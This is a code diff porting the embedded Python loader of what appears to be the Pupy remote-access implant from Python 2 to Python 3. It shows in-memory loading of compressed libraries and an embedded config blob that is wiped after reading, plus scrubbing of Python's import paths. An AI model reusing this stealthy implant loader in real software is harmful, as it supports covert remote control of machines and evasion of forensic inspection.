@@ -1,13 +1,19 @@
-/* **************** Python-dynload.c **************** */
+/***************** Python-dynload.c **************** */
 
 #include "Python-dynload.h"
 #include "Python-dynload-os.h"
+
+#if PYMAJ > 2
+static void *uncompressed = NULL;
+static Py_ssize_t uncompressed_size = 0;
+#endif
 
 typedef struct dependency {
     const char* name;
     const char *bytes;
     size_t size;
     BOOL is_python;
+    void *args;
 } dependency_t;
 
 struct py_imports py_sym_table[] = {
@@ -16,8 +22,17 @@ struct py_imports py_sym_table[] = {
 };
 
 static char __config__[262144] = "####---PUPY_CONFIG_COMES_HERE---####\n";
+
 static PyGILState_STATE restore_state;
+
 static BOOL is_initialized = FALSE;
+
+#if PYMAJ > 2
+static wchar_t *program = NULL;
+#define MAGIC_SIZE (4 * 4)
+#else
+#define MAGIC_SIZE (2 * 4)
+#endif
 
 /* Likely-to-be-used modules */
 static const char *preload_modules[] = {
@@ -28,7 +43,12 @@ static const char *preload_modules[] = {
     "traceback",
     "_weakrefset",
     "abc",
+#if PYMAJ > 2
+    "io",
+    ENCODINGS ".*",
+#else
     ENCODINGS ".aliases",
+#endif
     NULL
 };
 
@@ -69,14 +89,18 @@ static HMODULE xz_dynload(const char *libname, const char *xzbuf, size_t xzsize,
 }
 
 
-BOOL initialize_python(int argc, char *argv[], BOOL is_shared_object) {
+BOOL initialize_python(int argc, char *argv[], BOOL is_shared_object, pupy_init_t *init) {
     HMODULE hPython = NULL;
     PyObject *py_argv = NULL;
-    PyObject *py_empty_list = NULL;
-    dependency_t dependencies[] = DEPENDENCIES;
     resolve_symbol_t resolver = NULL;
-    dependency_t *dependency = NULL;
     struct py_imports *py_sym = NULL;
+    dependency_t dependencies[] = DEPENDENCIES;
+    dependency_t *dependency = NULL;
+
+#if PYMAJ < 3
+    PyObject *py_empty_list = NULL;
+#endif
+
     int i;
 
     if (is_initialized) {
@@ -84,10 +108,10 @@ BOOL initialize_python(int argc, char *argv[], BOOL is_shared_object) {
     }
 
 #ifdef DEBUG_USE_OS_PYTHON
-    hPython = OSLoadLibrary("libpython2.7.so.1.0");
+    hPython = OSLoadLibrary(PYTHON_LIB_NAME);
     resolver = OSResolveSymbol;
 #else
-    for (dependency=dependencies; !hPython; dependency ++) {
+    for (dependency=dependencies; dependency->bytes != NULL; dependency ++) {
         HMODULE hModule = CheckLibraryLoaded(dependency->name);
 
         if (hModule) {
@@ -102,7 +126,8 @@ BOOL initialize_python(int argc, char *argv[], BOOL is_shared_object) {
         dprint("Loading %s\n", dependency->name);
 
         hModule = xz_dynload(
-            dependency->name, dependency->bytes, dependency->size, NULL
+            dependency->name, dependency->bytes, dependency->size,
+            dependency->args
         );
 
         dprint("Loaded %s -> %p\n", dependency->name, hModule);
@@ -131,25 +156,80 @@ BOOL initialize_python(int argc, char *argv[], BOOL is_shared_object) {
         }
     }
 
+    if (init) {
+        dprint("_pupy init function at: %p -> %p\n", init, *init);
+
+        if (PyImport_AppendInittab("_pupy", *init) != 0) {
+            dprint("Extending python builtins failed\n");
+            return -1;
+        }
+    }
+
+#if PYMAJ > 2
+    dprint("Stdlib size: %d\n", library_c_size);
+
+    uncompressed = lzmaunpack(
+        library_c_start, library_c_size, &uncompressed_size
+    );
+
+    if (!uncompressed) {
+        dprint("Stdlib decompress failed\n", library_c_size);
+        return FALSE;
+    }
+
+    {
+        struct _frozen *tmp = PyFrozen_fromKV(
+            uncompressed, uncompressed_size, preload_modules
+        );
+
+        if (!tmp) {
+            dprint("Setting up frozen modules failed\n");
+            goto lbExit1;
+        }
+
+        PyImport_FrozenModules = tmp;
+    }
+#endif
+
     PyEval_InitThreads();
     if(!Py_IsInitialized()) {
+#if PYMAJ == 2
+        const char *program = OSGetProgramName();
         char * ppath = Py_GetPath();
+
         if (ppath)
             memset(ppath, '\0', strlen(ppath));
 
-        Py_FileSystemDefaultEncoding = FILE_SYSTEM_ENCODING;
+#else
+        const char *c_program = OSGetProgramName();
+        size_t pathlen = mbstowcs(NULL, c_program, 0);
+        wchar_t *ppath = Py_GetPath();
+
+        program = (wchar_t*) malloc((pathlen + 1) * sizeof(wchar_t));
+        memset(program, 0x0, (pathlen + 1) * sizeof(wchar_t));
+        mbstowcs(program, c_program, pathlen);
+
+        if (ppath)
+            memset(ppath, '\0', wcslen(ppath) * sizeof(wchar_t));
+
+#endif
+        Py_FileSystemDefaultEncoding = strdup(FILE_SYSTEM_ENCODING);
         Py_IgnoreEnvironmentFlag = 1;
         Py_NoSiteFlag = 1;
         Py_NoUserSiteDirectory = 1;
         Py_OptimizeFlag = 2;
         Py_DontWriteBytecodeFlag = 1;
 
-        Py_SetProgramName(OSGetProgramName());
+        Py_SetProgramName(program);
+
+        dprint("Initialize python\n");
         Py_InitializeEx(is_shared_object? 0 : 1);
+        dprint("Initialized\n");
     }
 
     restore_state = PyGILState_Ensure();
 
+#if PYMAJ < 3
     py_empty_list = PyList_New(0);
     if (!py_empty_list) {
         dprint("Couldn't allocate list for sys.path\n");
@@ -157,6 +237,7 @@ BOOL initialize_python(int argc, char *argv[], BOOL is_shared_object) {
     }
 
     PySys_SetObject("path", py_empty_list);
+#endif
 
     dprint("SET ARGV (ARGC=%d; SHARED? %d)\n", argc, is_shared_object);
 
@@ -190,6 +271,7 @@ BOOL initialize_python(int argc, char *argv[], BOOL is_shared_object) {
     setup_jvm_class();
 
     dprint("Python initialized\n");
+
     return TRUE;
 
 lbExit1:
@@ -400,14 +482,12 @@ PyObject* py_module_from_stdlib(PyObject *py_stdlib, const char *name, int is_in
     PyObject *pybody = NULL;
     PyObject *pybytecode = NULL;
 
-    char *pybody_c_ptr = NULL;
+    const char *pybody_c_ptr = NULL;
     Py_ssize_t pybody_c_size = 0;
 
     char *vpath_name = NULL;
     char *path_name = NULL;
     char *ptr = NULL;
-
-    int is_path = 1;
 
     // pupy:// name /__init__.pyo
     // OR
@@ -456,7 +536,7 @@ PyObject* py_module_from_stdlib(PyObject *py_stdlib, const char *name, int is_in
         name, is_init, path_name, pybody
     );
 
-    if (PyString_AsStringAndSize(pybody, &pybody_c_ptr, &pybody_c_size) == -1) {
+    if (PyBytes_AsStringAndSize(pybody, &pybody_c_ptr, &pybody_c_size) == -1) {
         dprint(
             "py_module_from_library(%s, %d) -> %s -> Invalid type?\n",
             name, is_init, path_name
@@ -472,7 +552,7 @@ PyObject* py_module_from_stdlib(PyObject *py_stdlib, const char *name, int is_in
     );
 
     pybytecode = PyMarshal_ReadObjectFromString(
-        pybody_c_ptr + 8, pybody_c_size - 8
+        pybody_c_ptr + MAGIC_SIZE, pybody_c_size - MAGIC_SIZE
     );
 
     if (!pybytecode) {
@@ -516,6 +596,7 @@ lbMemFailure1:
 }
 
 
+#if PYMAJ < 3
 void py_clear_sys_list(const char *name)
 {
     PyObject *list_obj;
@@ -565,7 +646,7 @@ void py_clear_sys_dict(const char *name)
 
     dprint("sys.%s - cleared\n", name);
 }
-
+#endif
 
 void run_pupy() {
     union {
@@ -578,15 +659,16 @@ void run_pupy() {
     PyObject *py_config_list;
     PyObject *py_pupylib;
     PyObject *py_stdlib;
-    PyObject *py_stdlib_keys;
-    PyObject *py_stdlib_keys_iter;
-    PyObject *py_stdlib_keys_item;
     PyObject *pupy_dict;
     PyObject *py_debug;
     PyObject *py_main;
     PyObject *py_eval_result;
     PyObject *py_config = NULL;
 
+#if PYMAJ < 3
+    PyObject *py_stdlib_keys;
+    PyObject *py_stdlib_keys_iter;
+    PyObject *py_stdlib_keys_item;
     const char **preload_module = NULL;
 
     dprint("Clean sys defaults\n");
@@ -595,6 +677,7 @@ void run_pupy() {
     py_clear_sys_list("meta_path");
     py_clear_sys_list("path_hooks");
     py_clear_sys_dict("path_importer_cache");
+#endif
 
     dprint("Load config\n");
     len.c[3] = __config__[0];
@@ -620,18 +703,36 @@ void run_pupy() {
     dprint("Cleanup config\n");
     memset(__config__, 0xFF, len.l + 4);
 
+#if PYMAJ < 3
     dprint("Stdlib size: %d\n", library_c_size);
     py_stdlib = PyDict_lzmaunpack(library_c_start, library_c_size);
     if (!py_stdlib) {
-        goto lbExit2;
+        dprint("Stdlib unpack failed\n");
+        goto lbExit4;
     }
 
+#else
+    dprint("Stdlib uncompressed size: %d\n", uncompressed_size);
+    py_stdlib = PyLibrary_fromKV(uncompressed, uncompressed_size, preload_modules);
+    if (!py_stdlib) {
+        dprint("Stdlib unpack failed\n");
+        goto lbExit4;
+    }
+
+#endif
     dprint("Stdlib unpacked: %p\n", py_stdlib);
 
     dprint("Unmap stdlib..\n");
     OSUnmapRegion(library_c_start, library_c_size);
     OSUnmapRegion(__config__, len.l);
     dprint("Unmap stdlib.. done\n");
+
+#if PYMAJ > 2
+    lzmafree(uncompressed, uncompressed_size);
+
+    uncompressed = NULL;
+    uncompressed_size = 0;
+#endif
 
     py_config = PyList_GetItem(py_config_list, 0);
     dprint("Get config: %p\n", py_config);
@@ -644,6 +745,7 @@ void run_pupy() {
 
     Py_IncRef(py_config);
 
+#if PYMAJ < 3
     dprint("Preload basic modules\n");
     for (preload_module=preload_modules; *preload_module; preload_module ++) {
         if (!py_module_from_stdlib(py_stdlib, *preload_module, 0))
@@ -692,6 +794,7 @@ void run_pupy() {
     }
 
     Py_DecRef(py_stdlib_keys_iter);
+#endif
 
     dprint("Loading pupy\n");
     pupy = py_module_from_stdlib(py_stdlib, "pupy", 1);
@@ -724,7 +827,10 @@ void run_pupy() {
         py_main, Py_None, py_debug, py_config, py_stdlib, NULL);
 
     if (!py_eval_result) {
-        PyErr_Print();
+        if (PyErr_Occurred) {
+            dprint("pupy.main failed with exception\n");
+            PyErr_Print();
+        }
     } else {
         Py_DecRef(py_eval_result);
     }
@@ -740,7 +846,13 @@ lbExit4:
 lbExit3:
     Py_DecRef(py_config_list);
 
-lbExit2:
+#if PYMAJ < 2
+    if (uncompressed)
+        OSFree(uncompressed);
+
+    uncompressed_size = 0;
+#endif
+
     Py_DecRef(py_stdlib);
 
 lbExit1:
@@ -751,6 +863,13 @@ void deinitialize_python() {
     dprint("Deinitialize python\n");
     PyGILState_Release(restore_state);
     Py_Finalize();
+
+#if PYMAJ > 2
+    if (program) {
+      PyMem_RawFree(program);
+      program = NULL;
+    }
+#endif
 }
 
 int Py_RefCnt(const PyObject *object) {
@@ -759,3 +878,5 @@ int Py_RefCnt(const PyObject *object) {
 
     return *((int *) object);
 }
+
+#include "Python-dynload-compat.c"
